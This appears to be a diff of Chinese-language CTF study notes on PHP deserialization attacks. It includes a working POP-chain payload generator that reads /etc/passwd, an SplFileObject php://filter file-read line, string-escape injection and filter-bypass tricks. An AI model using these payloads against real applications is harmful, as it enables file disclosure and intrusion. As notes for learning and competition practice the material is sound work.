@@ -3,6 +3,12 @@
 `serialize()`
 `unserialize()`
 
+通过`phar://`协议对一个`phar`文件进行文件操作，如`file_get_contents`，也可以触发反序列化
+
+[利用 phar 拓展 php 反序列化漏洞攻击面 (seebug.org)](https://paper.seebug.org/680/)
+
+![](./image/serialize.png)
+
 ```
 __construct()，类的构造函数(创建对象时执行)
 __destruct()，类的析构函数（销毁对象时执行）
@@ -16,8 +22,11 @@ __unserialize()
 
 __call()，在对象中调用一个不可访问方法时调用
 __callStatic()，用静态方式中调用一个不可访问方法时调用
-__get()，获得一个类的成员变量时调用
+
+__get()，用于在外部访问不可访问或不存在的类属性时自动调用
+
 __set()，设置一个类的成员变量时调用
+
 __isset()，当对不可访问属性调用isset()或empty()时调用
 __unset()，当对不可访问属性调用unset()时被调用
 __sleep()，执行serialize()时，先会调用这个函数
@@ -53,9 +62,9 @@ if(!preg_match('/[oc]:\d+:/i', $_COOKIE['user']))
 ```
 [PHP反序列化中wakeup()绕过总结 – fushulingのblog](https://fushuling.com/index.php/2023/03/11/php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%adwakeup%e7%bb%95%e8%bf%87%e6%80%bb%e7%bb%93/)
 
-# 原生类的反序列化
+## 原生类的反序列化
 
-```
+```php
 当没有什么对象时的序列化，即用到原生类的反序列化
 
 SoapClient
@@ -80,7 +89,7 @@ SplFileObject只能读文件只能读取第一行的内容，可以使用php伪�
 $a = new SplFileObject("php://filter/read=convert.base64-encode/resource=/etc/passwd");  <br>echo $a;
 ```
 
-# 字符串逃逸
+## 字符串逃逸
 
 ```
 反序列化字符串逃逸，运用的思想跟sql注入的闭合相似
@@ -122,8 +131,7 @@ O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"2";s:2:"to";s:135:"loverlover
 
 ```
 
-
-# session序列化
+## session序列化
 
 ```
 关于session和cookie，建议都用bp而不用hackbar，不同cookie之间用;分隔
@@ -163,9 +171,65 @@ $str = new f4ke();
 ?>
 ```
 
-# 传址绕过
+## pop链
 
+```php
+通过魔术方法，先找到头和尾，逐步分析
+    
+例题：
+<?php
+class A{
+  public $var_1;
+  
+  public function __invoke(){
+	  echo 'a';
+   include($this->var_1);
+  }
+}
+
+class B{
+  public $q;
+  public function __wakeup()
+{
+	  echo 'b';
+  if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->q)) {
+            echo "hacker";           
+        }
+}
+
+}
+class C{
+  public $var;
+  public $z;
+    public function __toString(){
+		echo 'c';
+        return $this->z->var;
+    }
+}
+
+class D{
+  public $p;
+    public function __get($key){
+        $function = $this->p;
+		echo 'd';
+        return $function();
+    }  
+}
+$b=new B();
+$c=new C();
+$d=new D();
+$a=new A();
+$a->var_1="../../../../../../etc/passwd";
+$d->p=$a;
+$c->z=$d;
+$b->q=$c;
+echo urlencode(serialize($b));
+?>
 ```
+
+## 传址绕过
+
+```php
 当需要绕过需要不同值相同时，可采用传址绕过（在PHP中当令$a=&$b时，可直接意味两个变量的地址相同）
 
 例如：
@@ -193,9 +257,12 @@ echo $a->password,$a->token;
 
 ```
 
-
-# 大小写绕过
+## 特性
 
 ```
-当对象名被正则时，可以试试大小写，一般是不敏感（除非设置i）
+2.在PHP反序列化时,将s改为大写s，这样可以反序列化时可以识别十六进制字符。
+0:5: "DemoX" :3:{s:1:"a";N;S:8:"\00DemoX\00b" ;N;S:4:"\00*\00c" ;N;}
+
+大小写绕过,当对象名被正则时，可以试试大小写，一般是不敏感（除非设置i）
 ```
+
